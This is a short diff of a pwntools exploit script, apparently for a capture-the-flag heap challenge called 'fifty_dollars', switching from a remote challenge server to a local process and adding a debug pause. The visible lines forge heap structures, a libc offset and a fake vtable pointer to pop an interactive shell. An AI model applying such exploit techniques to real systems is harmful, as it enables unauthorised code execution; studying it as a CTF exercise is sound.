@@ -1,7 +1,7 @@
 from pwn import *
 
-#r = process(["./fifty_dollars"])
-r = remote("178.62.40.102",6001)
+r = process(["./fifty_dollars"])
+#r = remote("178.62.40.102",6001)
 def alloca(idx,content):
 	r.sendlineafter(":","1")
 	r.sendlineafter(":",str(idx))
@@ -80,6 +80,7 @@ alloca(0,p64(heap+0x100))
 alloca(0,"a")
 alloca(0,p64(0x1)+p64(0x2)+p64(0x3)+p64(0x0)*3+p64(libc+0x45390))
 alloca(0,"\x00"*0x10+p64(0x1)+"\x00"*0x10+p64(vtable)+p64(0x61))
+input()
 alloca(0,"")
 
 r.interactive()
